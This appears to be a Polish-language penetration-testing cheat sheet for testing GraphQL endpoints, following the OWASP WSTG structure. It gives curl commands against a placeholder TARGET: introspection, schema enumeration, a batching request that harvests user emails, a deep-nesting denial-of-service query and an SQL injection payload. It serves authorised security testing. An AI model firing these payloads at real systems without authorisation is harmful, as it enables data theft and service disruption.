# WSTG-APIT-99 — Testing GraphQL

## Cele

- Assess that a secure and production-ready configuration is deployed
- Validate all input fields against generic attacks
- Ensure that proper access controls are applied

## KOMENDY

### GraphQL Introspection

```bash
curl -s "https://TARGET/graphql" -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind } } } } }"}'

```

### Sprawdzenie czy introspection jest wlaczona

```bash
curl -s "https://TARGET/graphql" -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'

```

### Enumeracja queries

```bash
curl -s "https://TARGET/graphql" -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { queryType { fields { name description args { name type { name } } } } } }"}'

```

### Enumeracja mutations

```bash
curl -s "https://TARGET/graphql" -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'

```

### Batching attack

```bash
curl -s "https://TARGET/graphql" -X POST -H "Content-Type: application/json" -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},{"query":"{ user(id:3) { email } }"}]'

```

### DoS via deep nesting

```bash
curl -s "https://TARGET/graphql" -X POST -H "Content-Type: application/json" -d '{"query":"{ user { friends { friends { friends { friends { name } } } } } }"}'

```

### SQL Injection via GraphQL

```bash
curl -s "https://TARGET/graphql" -X POST -H "Content-Type: application/json" -d '{"query":"{ user(name:\"admin\\\" OR 1=1--\") { id email } }"}'

```

### InQL Burp Extension

```bash
# Zainstaluj InQL w Burp i wskaz endpoint GraphQL

```

### graphql-voyager

```bash
# Uzyj do wizualizacji schematu GraphQL

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings GraphQL

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/GraphQL Injection/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj endpoint GraphQL (/graphql, /gql, /query)
2. Testuj introspection query
3. Zmapuj caly schemat (queries, mutations, types)
4. Testuj autoryzacje na kazdym query/mutation
5. Testuj injection (SQLi, XSS) w argumentach
6. Sprawdz batching i deep nesting limits
7. Testuj field suggestions (nawet jesli introspection jest wylaczona)
8. Uzyj InQL Burp extension do automatyzacji

